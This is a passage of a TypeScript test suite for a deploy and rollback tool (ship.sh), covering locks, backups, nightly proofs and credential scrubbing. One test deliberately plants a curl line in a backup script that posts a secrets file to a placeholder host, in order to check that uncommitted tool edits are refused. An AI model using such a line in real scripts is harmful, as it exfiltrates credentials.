  assert.notEqual(a.code, 0);
  assert.match(a.out, /DEPLOYED BUT NOT GREEN: https:\/\/rawfactory\.huecycle\.in\/health answered 502; https:\/\/rawplatform\.huecycle\.in\/health answered 502; https:\/\/rawvault\.huecycle\.in\/health answered 502/);
  assert.match(a.out, /rawprod-deploy --rollback/);
  assert.equal(red.order().pop(), 'lock-release');

  // /health is the API behind each host. A console root left empty answers it with 200 all day.
  const blank = rig();
  blank.reply('curl.body', 'ok');
  const p = blank.run([blank.head, '--apply']);
  assert.notEqual(p.code, 0);
  assert.match(p.out, /DEPLOYED BUT NOT GREEN: https:\/\/rawfactory\.huecycle\.in\/ answered 200 with no page in it/);
  assert.match(p.out, /ship\.sh --rollback --role main --apply/);
  const ok = rig();
  const q = ok.run([ok.head, '--apply']);
  assert.match(q.out, /https:\/\/rawvault\.huecycle\.in\/ +: 200, a page/);
  assert.match(ok.evidence().pop()!.gates.find((g) => g.name === 'health')!.detail, /\/health and \/ answer 200/);

  const stale = rig();
  // deploy.sh "succeeded" but the box still reports the old commit.
  stale.reply('static.status', 'Failed');
  stale.reply('static.out', `REFUSED: DEPLOYED_SHA is not ${stale.head}, so the consoles are not published`);
  const b = stale.run([stale.head, '--apply']);
  assert.notEqual(b.code, 0);
  assert.match(b.out, /DEPLOYED BUT NOT GREEN|consoles were not published/);

  const wrong = rig();
  wrong.reply('deployed', wrong.base);
  wrong.reply('static.status', 'Success');
  const c = wrong.run([wrong.head, '--apply', '--base', wrong.base]);
  assert.notEqual(c.code, 0);
  assert.match(c.out, /DEPLOYED BUT NOT GREEN: DEPLOYED_SHA on the box is [0-9a-f]{40}, not [0-9a-f]{8}/);
});

// ── going back ──────────────────────────────────────────────────────────────────────────────────────

const OLDER = 'a'.repeat(40);

test('--rollback without --apply says what it would do and asks AWS nothing', () => {
  const r = rig();
  const x = r.run(['--rollback']);
  assert.equal(x.code, 0, x.out);
  assert.match(x.out, /The DATABASE does not move/);
  assert.match(x.out, /WOULD RUN on i-04e7dc4e5edcc1ff7: RAWPROD_ROLE=main \/usr\/local\/sbin\/rawprod-deploy --rollback/);
  assert.match(x.out, /WOULD RUN on i-04e7dc4e5edcc1ff7: infra\/aws\/nginx\/install-static\.sh prod/);
  assert.match(x.out, /VERDICT: DRY RUN: nothing was read and nothing was sent/);
  assert.deepEqual(r.calls(), []);
  assert.equal(r.pnpm(), '');
  const named = r.run([r.base, '--rollback', '--apply']);
  assert.equal(named.code, 2);
  assert.match(named.out, /--rollback takes no commit/);
  assert.deepEqual(r.calls(), [], 'a named commit is a deploy, and a deploy needs its proof');
});

test('--rollback --apply after a finished deploy: lock, the wrapper\'s own rollback to previous-sha, the consoles, the checks, release', () => {
  const r = rig();
  r.reply('deployed', r.head);
  r.reply('previous', r.base);
  const x = r.run(['--rollback', '--apply']);
  assert.equal(x.code, 0, x.out);
  assert.deepEqual(r.order(), ['status', 'lock-take', 'rollback', 'static', 'status', 'lock-release']);
  assert.match(x.out, /the last deploy finished: back is previous-sha/);
  assert.match(x.out, /VERDICT: ROLLED BACK GREEN: [0-9a-f]{8} on i-04e7dc4e5edcc1ff7 \(main\), was [0-9a-f]{8}\. The database was not touched/);
  assert.equal(r.pnpm(), '', 'a rollback builds nothing here');

  const sent = r.sent('rollback');
  assert.match(sent, new RegExp(`^SHA=${r.base}$`, 'm'), 'the box is told which commit the operator agreed to');
  // The wrapper that runs is the one beside this ship.sh, byte for byte, checked before it is installed.
  const wrapper = readFileSync(join(ROOT, 'infra/aws/deploy.sh'));
  assert.match(sent, new RegExp(`^WANT_ROLLBACK_SHA256=${sha256(wrapper)}$`, 'm'));
  assert.equal(Buffer.from(/^DEPLOY_B64=(\S+)$/m.exec(sent)![1]!, 'base64').toString('utf8'), wrapper.toString('utf8'));
  const at = (t: string) => { const i = sent.indexOf(t); assert.ok(i > 0, `the rollback script has no "${t}"`); return i; };
  const order = [at('[ "$got" = "$WANT_ROLLBACK_SHA256" ] ||'), at('[ "$ver" -ge 3 ] ||'), at('[ "$want" = "$SHA" ] ||'),
    at('/usr/local/sbin/rawprod-deploy; rm -f'), at('RAWPROD_ROLE="$ROLE" /usr/local/sbin/rawprod-deploy --rollback')];
  assert.deepEqual([...order].sort((a, b) => a - b), order, 'hash, version, target, install, run: in that order');
  // It sends the wrapper's flag and nothing that touches a schema or a unit.
  assert.doesNotMatch(sent, /pnpm|db:|psql|systemctl|migrate/);
  // The consoles published are the ones of the commit it returned to.
  assert.match(r.sent('static'), new RegExp(`^SHA=${r.base}$`, 'm'));

  const e = r.evidence(r.base).pop()!;
  assert.match(e.verdict, /^ROLLED BACK GREEN/);
  assert.equal(e.mode, 'rollback-apply');
  assert.equal(verify(e), true);
  assert.equal(isReusableProof(e, { sha: r.base, base: r.base, role: 'main', tool: sha256(readFileSync(SHIP)) }), false, 'a rollback proves nothing a deploy may reuse');
  assert.equal(lastDeployed(join(r.dir, 'evidence'), 'main'), r.base, 'the next dry run diffs against what is live now');
});

test('--rollback --apply after a deploy that did not finish goes to the commit that last passed health, not one further back', () => {
  // A failed build or a failed health check: the checkout is at the new commit, DEPLOYED_SHA still names
  // the last good one, and previous-sha is one release behind that.
  const r = rig();
  r.reply('deployed', r.base);
  r.reply('checkout', r.head);
  r.reply('previous', OLDER);
  r.reply('rollback_to', r.base);
  const x = r.run(['--rollback', '--apply']);
  assert.equal(x.code, 0, x.out);
  assert.match(x.out, /the last deploy did NOT finish \(the checkout is at [0-9a-f]{8}\): back is the commit that last passed health/);
  assert.match(r.sent('rollback'), new RegExp(`^SHA=${r.base}$`, 'm'));
  assert.doesNotMatch(r.sent('rollback'), new RegExp(`^SHA=${OLDER}$`, 'm'));
  // And the box decides the same way before it installs anything.
  assert.match(r.sent('rollback'), /if \[ -n "\$deployed" \] && \[ "\$deployed" != "\$checkout" \]; then want=\$deployed; fi/);
});

test('--rollback --apply: a rollback the wrapper refuses publishes nothing, says fix forward, and releases the lock', () => {
  const r = rig();
  r.reply('deployed', r.head);
  r.reply('previous', r.base);
  r.reply('rollback.status', 'Failed');
  r.reply('rollback.out', 'REFUSED: THIS IS NOT A ROLLBACK THAT IS SAFE TO DO.\nrollback_exit=3');
  const x = r.run(['--rollback', '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /THIS IS NOT A ROLLBACK THAT IS SAFE TO DO/, 'the wrapper\'s own words are shown');
  assert.match(x.out, /fix forward/);
  assert.deepEqual(r.order(), ['status', 'lock-take', 'rollback', 'lock-release']);
  assert.match(r.evidence(r.base).pop()!.verdict, /^ROLLBACK FAILED/);
});

test('--rollback --apply refuses with nothing to go back to, under a held host, and is not green on a red check', () => {
  const none = rig();
  none.reply('deployed', none.head);
  const a = none.run(['--rollback', '--apply']);
  assert.notEqual(a.code, 0);
  assert.match(a.out, /records no previous commit \(none\), so there is nothing to go back to/);
  assert.deepEqual(none.order(), ['status']);

  const same = rig();
  same.reply('deployed', same.head);
  same.reply('previous', same.head);
  assert.match(same.run(['--rollback', '--apply']).out, /both the deployed and the previous commit/);
  assert.deepEqual(same.order(), ['status']);

  const held = rig();
  held.reply('deployed', held.head);
  held.reply('previous', held.base);
  held.reply('deploy_flock', 'held by alembic pid 4242 since 2026-11-12T08:00:00Z');
  const b = held.run(['--rollback', '--apply']);
  assert.notEqual(b.code, 0);
  assert.match(b.out, /REFUSED: a deploy is running on i-04e7dc4e5edcc1ff7 right now/);
  assert.deepEqual(held.order(), ['status']);

  const red = rig();
  red.reply('deployed', red.head);
  red.reply('previous', red.base);
  red.reply('curl', '502');
  const c = red.run(['--rollback', '--apply']);
  assert.notEqual(c.code, 0);
  assert.match(c.out, /ROLLED BACK BUT NOT GREEN: https:\/\/rawfactory\.huecycle\.in\/health answered 502/);
  assert.equal(red.order().pop(), 'lock-release');
});

test('nothing here, and nothing the box is sent, runs a down migration', () => {
  // Locally the rehearsal only ever runs these three, and only against 127.0.0.1.
  const scripts = [...new Set([...src.matchAll(/pnpm db:([a-z:-]+)/g)].map((m) => m[1]))].sort();
  assert.deepEqual(scripts, ['migrate', 'seed', 'validate']);
  assert.match(src, /pg_url\(\) \{ echo "postgres:\/\/ship@127\.0\.0\.1:\$PG_PORT\/\$1"; \}/);
  // No script sent to the box names pnpm, a db: script, psql or a migration at all.
  const remote = src.slice(src.indexOf('remote_head() {'), src.indexOf('sha256_of() {'));
  assert.doesNotMatch(remote.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n'), /pnpm|db:|psql|\bdown\b/);
  // And the wrapper the box runs has one migration command: its migrate unit, which runs db:migrate.
  const wrapper = read('infra/aws/deploy.sh').split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
  assert.doesNotMatch(wrapper, /db:migrate:down|migrate:down|db:rollback|db:reset|db:drop/);
  assert.match(read('infra/aws/systemd/rawprod-migrate.service'), /^ExecStart=\/usr\/bin\/env pnpm db:migrate$/m);
  const pkg = JSON.parse(read('package.json')) as { scripts: Record<string, string> };
  assert.deepEqual(Object.keys(pkg.scripts).filter((k) => /^db:.*(down|rollback|reset|drop)/.test(k)), [], 'there is no down script to run by mistake');
});

// ── what may be shipped at all ──────────────────────────────────────────────────────────────────────

test('a commit that is not on origin is refused with the push command, before anything is read', () => {
  const r = rig({ pushHead: false });
  const x = r.run([r.head, '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /is on no branch of origin, so the box cannot fetch it\. Push it first: git push origin [0-9a-f]{40}:refs\/heads\/<branch>/);
  assert.deepEqual(r.calls(), []);
});

test('a deployed commit this clone has never seen is refused, not diffed against nothing', () => {
  const r = rig();
  r.reply('deployed', 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef');
  const x = r.run([r.head, '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /production runs deadbeefdeadbeefdeadbeefdeadbeefdeadbeef, and that commit is not in this clone/);
  assert.equal(r.pnpm(), '');
  assert.deepEqual(r.order(), ['status'], 'read, and nothing sent after it');
  // The same on a dry run, where the base is somebody's word.
  const y = r.run([r.head, '--base', 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeef']);
  assert.notEqual(y.code, 0);
  assert.match(y.out, /that commit is not in this clone/);
});

test('a commit that does not descend from production is refused: that is a rollback, and deploy.sh guards those', () => {
  const r = rig();
  const x = r.run([r.base, '--base', r.head, '--offline']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /does not descend from what production runs/);
});

test('--base that contradicts the box is refused', () => {
  const r = rig();
  const x = r.run([r.head, '--base', r.head, '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /--base says production runs [0-9a-f]{8}, the box says [0-9a-f]{8}/);
  assert.deepEqual(r.order(), ['status']);
});

test('a commit whose deploy.sh does not take the host lock is not shipped', () => {
  const r = rig({ lockInDeploy: false });
  const x = r.run([r.head, '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /does not take \/run\/lock\/raw-host-deploy\.lock, so its build could run beside Alembic's/);
  assert.deepEqual(r.order(), ['status']);
});

test('a red local gate stops the ship before production is touched, and keeps the worktree to read', () => {
  const r = rig();
  writeFileSync(join(r.dir, 'bin/pnpm'), `#!/usr/bin/env bash\necho "pnpm $*" >> "${join(r.state, 'pnpm.log')}"\ncase "$*" in *typecheck*) echo "error TS2345: nope"; exit 2;; esac\n`);
  const x = r.run([r.head, '--apply']);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /FAILED\s+typecheck/);
  assert.match(x.out, /error TS2345: nope/, 'the end of the gate\'s log is printed');
  assert.match(x.out, /kept for reading: /);
  assert.deepEqual(r.order(), ['status']);
  assert.doesNotMatch(r.pnpm(), /build/, 'the build did not run after a red typecheck');
  assert.equal(r.evidence().pop()!.local_proof, 'incomplete');
});

// ── one proof per commit ────────────────────────────────────────────────────────────────────────────

test('--apply after a dry run reuses its proof; --reprove, another base, or an edited file does not', () => {
  const r = rig();
  assert.equal(r.run([r.head]).code, 0);
  const built = r.pnpm();
  const x = r.run([r.head, '--apply']);
  assert.equal(x.code, 0, x.out);
  assert.match(x.out, /reused\s+local proof/);
  assert.equal(r.pnpm(), built, 'nothing was built a second time');
  assert.equal(r.evidence().find((e) => e.mode === 'apply')!.local_proof, 'reused');

  assert.equal(r.run([r.head, '--reprove']).code, 0);
  assert.notEqual(r.pnpm(), built, '--reprove builds again');

  const proof = r.evidence().find((e) => e.mode === 'dry-run' && e.local_proof === 'ok')!;
  const tool = sha256(readFileSync(SHIP));
  const ask = { sha: r.head, base: r.base, role: 'main', tool };
  assert.equal(isReusableProof(proof, ask), true);
  assert.equal(isReusableProof(proof, { ...ask, base: r.head }), false, 'production moved: prove again');
  assert.equal(isReusableProof(proof, { ...ask, role: 'vault' }), false);
  assert.equal(isReusableProof(proof, { ...ask, tool: 'another ship.sh' }), false);
  assert.equal(isReusableProof(proof, { ...ask, now: Date.parse(proof.finished) + 25 * 3600 * 1000 }), false, 'a day old');
  assert.equal(isReusableProof({ ...proof, local_proof: 'ok', gates: [] }, ask), false, 'edited after the seal');
});

// ── the vault box ───────────────────────────────────────────────────────────────────────────────────

test('--role vault: its own box and lock, RDS point-in-time recovery instead of a dump, no console publish', () => {
  const r = rig();
  const x = r.run([r.head, '--role', 'vault', '--apply']);
  assert.equal(x.code, 0, x.out);
  assert.deepEqual(r.order(), ['status', 'lock-take', 'rds', 'deploy', 'status', 'lock-release']);
  assert.ok(r.calls().filter((c) => c.op === 'send').every((c) => c.instance === VAULT));
  assert.equal(r.calls().find((c) => c.op === 'rds')!.db, 'vault-pg');
  assert.match(r.sent('deploy'), /^ROLE=vault$/m);
  assert.match(x.out, /skipped\s+publish consoles/);

  const stale = rig();
  stale.reply('pitr', new Date(Date.now() - 3600 * 1000).toISOString());
  const y = stale.run([stale.head, '--role', 'vault', '--apply']);
  assert.notEqual(y.code, 0);
  assert.match(y.out, /vault-pg can be restored only to .* the limit is 900s\. No deploy was started/);
  assert.equal(stale.order().includes('deploy'), false);
  assert.equal(stale.order().pop(), 'lock-release');
});

// ── the on-box backup script ────────────────────────────────────────────────────────────────────────

function backupRig(opt: { bytes?: number; list?: string } = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'ship-rp-backup-'));
  dirs.push(dir);
  const bin = join(dir, 'bin');
  mkdirSync(bin);
  const calls = join(dir, 'calls');
  writeFileSync(calls, '');
  writeFileSync(join(dir, 'migrate.env'), 'NODE_ENV=production\nDATABASE_URL=postgres://owner:not-a-real-secret@db/rawprod\nSKIP_TARGETS=formula\n');
  writeFileSync(join(dir, 'list.txt'), `${opt.list ?? ';\n; Archive\n1; 0 0 TABLE public t owner\n2; 0 0 TABLE DATA public t owner'}\n`);
  stub(bin, 'pg_dump', `echo "pg_dump $2" >> "${calls}"\nhead -c ${opt.bytes ?? 600000} /dev/zero > "$4"`);
  stub(bin, 'pg_restore', `echo "pg_restore $1" >> "${calls}"\ncat "${join(dir, 'list.txt')}"`);
  stub(bin, 'aws', `echo "aws $*" >> "${calls}"`);
  const run = (extra: Record<string, string> = {}) => {
    const r = spawnSync('bash', [BACKUP], { encoding: 'utf8', env: { PATH: `${bin}:/usr/bin:/bin`, RAWPROD_BACKUP_ENVFILE: join(dir, 'migrate.env'), ...extra } });
    return { code: r.status, out: r.stdout, err: r.stderr };
  };
  return { dir, run, calls: () => readFileSync(calls, 'utf8') };
}

test('rawprod-backup.sh: dump, read back, upload, one line for ship.sh, and the URL never printed', () => {
  const b = backupRig();
  const x = b.run();
  assert.equal(x.code, 0, x.err);
  assert.match(x.out, /^rawprod-backup OK bucket=alembic-backups-859485559854-usw2 key=rawprod\/pg_dump\/\d{8}T\d{6}Z\.dump bytes=600000 sha256=[0-9a-f]{64} entries=2 tables=1$/m);
  const c = b.calls();
  assert.ok(c.indexOf('pg_dump') < c.indexOf('pg_restore --list') && c.indexOf('pg_restore --list') < c.indexOf('aws s3 cp'), 'dump, read back, then upload');
  assert.match(c, /aws s3 cp --only-show-errors --sse AES256 \S+ s3:\/\/alembic-backups-859485559854-usw2\/rawprod\/pg_dump\/\d{8}T\d{6}Z\.dump/);
  assert.doesNotMatch(`${x.out}${x.err}`, /not-a-real-secret/);
});

test('rawprod-backup.sh: an archive that is too small, holds no table data, or has no URL is not uploaded', () => {
  const small = backupRig({ bytes: 1000 });
  const a = small.run();
  assert.notEqual(a.code, 0);
  assert.match(a.err, /rawprod-backup FAILED: the archive is 1000 bytes, under the floor of 500000/);
  assert.doesNotMatch(small.calls(), /aws s3 cp/);

  const empty = backupRig({ list: ';\n; Archive\n1; 0 0 TABLE public t owner' });
  const b = empty.run();
  assert.notEqual(b.code, 0);
  assert.match(b.err, /lists no table data/);
  assert.doesNotMatch(empty.calls(), /aws s3 cp/);

  const none = backupRig();
  const c = none.run({ RAWPROD_BACKUP_ENVFILE: join(none.dir, 'absent.env') });
  assert.notEqual(c.code, 0);
  assert.match(c.err, /so the database URL cannot be read/);
});

// ── nothing local can reach production ──────────────────────────────────────────────────────────────

const TOOL_FILES = ['infra/aws/ship.sh', 'infra/aws/ship-evidence.mjs', 'infra/aws/deploy.sh', 'infra/aws/backup/rawprod-backup.sh',
  'infra/aws/fast-proof-always.txt', 'scripts/touched-tests.mjs'];

/** A committed copy of the tools, so a test can dirty them without touching this checkout. */
function toolsCopy() {
  const t = mkdtempSync(join(tmpdir(), 'ship-rp-tools-'));
  dirs.push(t);
  for (const f of TOOL_FILES) { mkdirSync(dirname(join(t, f)), { recursive: true }); writeFileSync(join(t, f), readFileSync(join(ROOT, f))); }
  chmodSync(join(t, 'infra/aws/ship.sh'), 0o755);
  const g = (...a: string[]) => execFileSync('git', ['-C', t, '-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { encoding: 'utf8' });
  g('init', '--quiet', '-b', 'main'); g('add', '.'); g('commit', '--quiet', '-m', 'tools');
  return t;
}

test('a checkout with uncommitted changes is refused, on a dry run too, before anything is built or asked', () => {
  const r = rig();
  r.put('web/index.html', '<html>edited, not committed</html>\n');
  const x = r.run([r.head]);
  assert.notEqual(x.code, 0);
  assert.match(x.out, /has uncommitted changes, so what you have been looking at is not the commit you named/);
  assert.match(x.out, /M web\/index\.html/);
  assert.match(x.out, /Not git stash/);
  assert.equal(r.pnpm(), '');
  assert.deepEqual(r.calls(), []);
  // An untracked file is not part of any commit and is not refused.
  r.g(r.clone, 'checkout', '--quiet', '--', 'web/index.html');
  r.put('scratch.txt', 'notes\n');
  assert.equal(r.run([r.head]).code, 0);
});

test('a ship.sh, wrapper or backup script nobody committed never runs: they go to the box as root', () => {
  const r = rig();
  const t = toolsCopy();
  const ship = join(t, 'infra/aws/ship.sh');
  const go = (args: string[]) => { const p = spawnSync('bash', [ship, ...args], { encoding: 'utf8', env: r.env }); return { code: p.status, out: `${p.stdout}${p.stderr}` }; };
  const clean = go([r.head]);
  assert.equal(clean.code, 0, `clean tools: the dry run passes\n${clean.out}`);
  writeFileSync(join(t, 'infra/aws/backup/rawprod-backup.sh'), readFileSync(BACKUP, 'utf8') + 'curl -d @/etc/rawprod/migrate.env https://example.invalid\n');
  const before = r.pnpm();
  for (const args of [[r.head, '--apply'], ['--rollback', '--apply'], ['--unlock', '--apply']]) {
    const x = go(args);
    assert.notEqual(x.code, 0, args.join(' '));
    assert.match(x.out, /differ from its HEAD, and ship\.sh runs them or sends them to the box as root/);
    assert.match(x.out, /M infra\/aws\/backup\/rawprod-backup\.sh/);
  }
  assert.deepEqual(r.calls(), [], 'nothing was read or sent');
  assert.equal(r.pnpm(), before, 'nothing was built');
});

test('the operator\'s database URLs and AWS credentials never reach a local gate, and no value is printed', () => {
  const r = rig();
  const seen = join(r.state, 'env-seen');
  stub(r.bin, 'pnpm', `echo "pnpm $*" >> "${join(r.state, 'pnpm.log')}"
env | grep -E '^(DATABASE_URL|FORMULA_DATABASE_URL|PGPASSWORD|PGHOST|AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_PROFILE|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE)=' >> "${seen}" || true`);
  const secret = 'hunter2-prod-only';
  const x = r.run([r.head], {
    DATABASE_URL: `postgres://owner:${secret}@prod.example:5432/rawprod`, FORMULA_DATABASE_URL: `postgres://v:${secret}@vault.example/f`,
    PGPASSWORD: secret, PGHOST: 'prod.example', AWS_ACCESS_KEY_ID: 'AKIAEXAMPLE', AWS_SECRET_ACCESS_KEY: secret, AWS_PROFILE: 'rawaroma',
  });
  assert.equal(x.code, 0, x.out);
  const lines = readFileSync(seen, 'utf8').split('\n').filter(Boolean);
  assert.ok(lines.length > 0, 'the stub ran');
  for (const l of lines) assert.match(l, /^AWS_(CONFIG_FILE|SHARED_CREDENTIALS_FILE)=\/dev\/null$/, `a local gate saw ${l}`);
  assert.match(x.out, /removed from this run's environment \(names only\): .*DATABASE_URL.*PGPASSWORD/);
  assert.doesNotMatch(x.out, new RegExp(secret));
  const e = r.evidence().pop()!;
  assert.doesNotMatch(JSON.stringify(e), new RegExp(secret), 'nor is a value written to the evidence');
  // --apply still reaches AWS: the profile is the script's, captured before the scrub, and passed by flag.
  const a = rig();
  assert.equal(a.run([a.head, '--apply'], { AWS_PROFILE: 'rawaroma', DATABASE_URL: 'postgres://x@prod.example/rawprod' }).code, 0);
});

test('ship.sh refuses to run under a shell that is not bash, whose paths would be wrong', () => {
  const shells = ['zsh', 'dash'].filter((s) => spawnSync('sh', ['-c', `command -v ${s}`]).status === 0);
  for (const sh of shells) {
    const p = spawnSync(sh, [SHIP, 'HEAD'], { encoding: 'utf8' });
    assert.equal(p.status, 2, `${sh}: ${p.stdout}${p.stderr}`);
    assert.match(`${p.stdout}${p.stderr}`, /is a bash script/);
  }
  // And wherever neither shell exists, the guard is still the first thing that runs.
  assert.ok(src.indexOf('[ -n "${BASH_VERSION:-}" ] ||') < src.indexOf('set -euo pipefail'));
});

// ── the nightly job ─────────────────────────────────────────────────────────────────────────────────

const nsrc = readFileSync(NIGHTLY, 'utf8');

test('nightly-proof.sh makes no AWS call and writes nothing a deploy reads', () => {
  execFileSync('bash', ['-n', NIGHTLY]);
  const code = nsrc.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
  assert.doesNotMatch(code, /\baws (s3api|s3|rds|sns|ssm|ec2|sts)\b/);
  assert.doesNotMatch(code, /pkill|killall/);
  // Its one use of the ship evidence is a read: which commit went green last.
  assert.deepEqual([...code.matchAll(/\$EVIDENCE_ROOT/g)].length, 1);
  assert.match(code, /ship-evidence\.mjs" last-deployed --root "\$EVIDENCE_ROOT"/);
  assert.match(code, /OUT_ROOT="\$\{RAWPROD_NIGHTLY_DIR:-\$HOME\/\.rawprod\/nightly\}"/);
  // The browser walks are not a default leg, and when asked for, e2e:down runs on every exit.
  assert.match(code, /^SHA_ARG=""; LEGS="typecheck,unit";/m);
  assert.match(nsrc.slice(nsrc.indexOf('finish() {'), nsrc.indexOf('trap finish EXIT')), /pnpm e2e:down/);
  for (const wf of ['unit-tests', 'browser-suite']) {
    const y = read(`.github/workflows/${wf}.yml`);
    assert.match(y, /schedule:\n\s+- cron: '30 20 \* \* \*'/, `${wf}.yml runs every night`);
    assert.match(y, /workflow_dispatch:/);
  }
});

test('nightly-proof.sh: a plan runs nothing; a run writes the verdict where ship.sh reads it; a red one is red', () => {
  const r = rig();
  const night = (args: string[], extra: Record<string, string> = {}) => {
    const p = spawnSync('bash', [NIGHTLY, ...args], { encoding: 'utf8', env: { ...r.env, ...extra } });
    return { code: p.status, out: `${p.stdout}${p.stderr}` };
  };
  const plan = night(['--plan']);
  assert.equal(plan.code, 0, plan.out);
  assert.match(plan.out, /WOULD RUN: pnpm test, every file/);
  assert.match(plan.out, /NOT RUN: the browser walks/);
  assert.equal(r.pnpm(), '');

  const green = night(['--legs', 'typecheck']);
  assert.equal(green.code, 0, green.out);
  const latest = join(r.dir, '.rawprod', 'nightly', 'latest.json');
  const doc = JSON.parse(readFileSync(latest, 'utf8')) as { verdict: string; sha: string; legs: { name: string; status: string }[]; not_run: string[] };
  assert.equal(doc.verdict, 'GREEN');
  assert.equal(doc.sha, r.base, 'by default, the commit production runs (here RAWPROD_DEPLOYED_SHA)');
  assert.deepEqual(doc.legs.map((l) => `${l.name}:${l.status}`), ['install:ok', 'typecheck:ok']);
  assert.ok(doc.not_run.some((n) => /^unit: not asked for/.test(n)));
  assert.match(r.pnpm(), /typecheck/);
  assert.match(night(['--legs', 'typecheck']).out, /NOTHING NEW/);
  assert.equal(r.worktrees(), 1, 'its worktree is removed');
  assert.deepEqual(r.calls(), [], 'and AWS was asked nothing');

  stub(r.bin, 'pnpm', `case "$*" in *typecheck*) exit 1 ;; esac`);
  const red = night(['--legs', 'typecheck', '--force']);
  assert.equal(red.code, 1, red.out);
  assert.match(red.out, /VERDICT: RED/);
  assert.equal(JSON.parse(readFileSync(latest, 'utf8')).verdict, 'RED');

  // ship.sh prints it in front of the person deploying, and ships anyway: a report, not a gate.
  stub(r.bin, 'pnpm', `echo "pnpm $*" >> "${join(r.state, 'pnpm.log')}"`);
  const ship = r.run([r.head]);
  assert.equal(ship.code, 0, ship.out);
  assert.match(ship.out, /nightly: RED [0-9a-f]{8}/);
  assert.match(ship.out, /FAILED +typecheck/);
  assert.match(ship.out, /A red nightly is a defect that is already in production/);
});

// ── the script text ─────────────────────────────────────────────────────────────────────────────────

test('the two CLIs run when reached through a symlink: /tmp and /var are /private on macOS', () => {
  // A string compare of argv[1] against the module's own path made both a silent no-op there: exit 0, no
  // output. ship.sh then had no test selection, and an evidence path it printed named a file never written.
  const d = mkdtempSync(join(tmpdir(), 'ship-rp-link-'));
  dirs.push(d);
  execFileSync('ln', ['-s', join(ROOT, 'infra/aws'), join(d, 'aws')]);
  execFileSync('ln', ['-s', join(ROOT, 'scripts'), join(d, 'scripts')]);
  const ev = spawnSync(process.execPath, [join(d, 'aws/ship-evidence.mjs')], { encoding: 'utf8' });
  assert.equal(ev.status, 2, 'usage, from main()');
  assert.match(ev.stderr, /usage: ship-evidence\.mjs/);
  const tt = spawnSync(process.execPath, [join(d, 'scripts/touched-tests.mjs')], { encoding: 'utf8' });
  assert.notEqual(tt.status, 0, `main() ran and refused the missing arguments: ${tt.stdout}${tt.stderr}`);
  assert.match(src, /\[ -s "\$WORK\/selection\.json" \] \|\| die/);
  assert.match(src, /write --work "\$WORK" --out "\$out\/ship\.json" && \[ -s "\$out\/ship\.json" \]/);
});

test('ship.sh and the backup script are valid bash', () => {
  execFileSync('bash', ['-n', SHIP]);
  execFileSync('bash', ['-n', BACKUP]);
});

test('ship.sh sequences and refuses; deploy.sh stays the only deployment implementation', () => {
  const code = src.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
  assert.doesNotMatch(code, /pkill|killall/);
  assert.doesNotMatch(code, /systemctl\s+(restart|start|stop)/, 'no unit is restarted from here');
  assert.doesNotMatch(code, /checkout\s+(--quiet\s+)?--detach/, 'nothing is checked out on the box from here');
  assert.doesNotMatch(code, /get-secret-value/);
  assert.match(code, /\/usr\/local\/sbin\/rawprod-deploy "\$SHA"/);
  // On the box, a build happens only inside deploy.sh: no remote script names pnpm.
  const remote = code.slice(code.indexOf('remote_head() {'), code.indexOf('sha256_of() {'));
  assert.doesNotMatch(remote, /pnpm/);
});

test('every SSM command goes through ssm_read or ssm_apply, and only ssm_apply changes the box', () => {
  const sends = src.split('\n').map((l, i) => [i + 1, l] as const).filter(([, l]) => /\bssm_send\b/.test(l) && !/^\s*#/.test(l) && !/^ssm_send\(\)/.test(l));
  // The definition of ssm_read, the tail of ssm_apply, and the lock release in finish().
  assert.equal(sends.length, 3, sends.map(([n, l]) => `${n}: ${l}`).join('\n'));
  assert.ok(sends.some(([, l]) => /^ssm_read\(\) \{ ssm_send "\$@"; \}$/.test(l)));
  assert.ok(sends.some(([, l]) => /ssm_send lock-release/.test(l)));
  const code = src.split('\n').filter((l) => !/^\s*#/.test(l)).join('\n');
  const reads = [...code.matchAll(/ssm_read (\S+) /g)].map((m) => m[1]);
  assert.deepEqual([...new Set(reads)], ['status'], 'the only read-only command is the status read');
  const applies = [...code.matchAll(/ssm_apply (\S+) /g)].map((m) => m[1]);
  assert.deepEqual([...new Set(applies)].sort(), ['backup', 'deploy', 'lock-take', 'rollback', 'static', 'unlock']);
  // Both kinds need --apply: ssm_send itself refuses on a dry run, before it builds a command.
  const send = src.slice(src.indexOf('ssm_send() {'), src.indexOf('ssm_read() {'));
  assert.ok(send.indexOf('[ "$APPLY" = 1 ] || die') > 0 && send.indexOf('[ "$APPLY" = 1 ] || die') < send.indexOf('aws ssm send-command'));
  // Every other AWS call sits in a branch that tested --apply.
  const lines = src.replace(send, '').split('\n');
  const outside = lines.map((l, i) => [l, lines.slice(Math.max(0, i - 8), i).join('\n')] as const)
    .filter(([l]) => /\baws (s3api|s3|rds|sns|ssm|ec2|sts) /.test(l) && !/^\s*(#|echo |note |die )/.test(l));
  assert.equal(outside.length, 2, outside.map(([l]) => l).join('\n'));
  for (const [l, before] of outside) assert.match(before, /if \[ "\$APPLY" = 1 \]; then/, `not behind --apply: ${l}`);
  // And the status script changes nothing: it reads files and probes the flock.
  const status = src.slice(src.indexOf('remote_status() {'), src.indexOf('remote_lock_take() {'));
  assert.doesNotMatch(status, /\brm\b|>>|install |mkdir|printf '%s\\n' "\$LOCK_LINE" >/);
});

test('the lock is taken before the backup, the backup before the deploy, the consoles and health after it', () => {
  const at = (s: string) => { const i = src.indexOf(s); assert.ok(i > 0, `ship.sh has no "${s}"`); return i; };
  // The deploy, from the line that opens it. (The rollback block above it has its own order, below.)
  const from = at('say "production: $INSTANCE ($ROLE)"');
  const after = (t: string) => { const i = src.indexOf(t, from); assert.ok(i > 0, `the deploy has no "${t}"`); return i; };
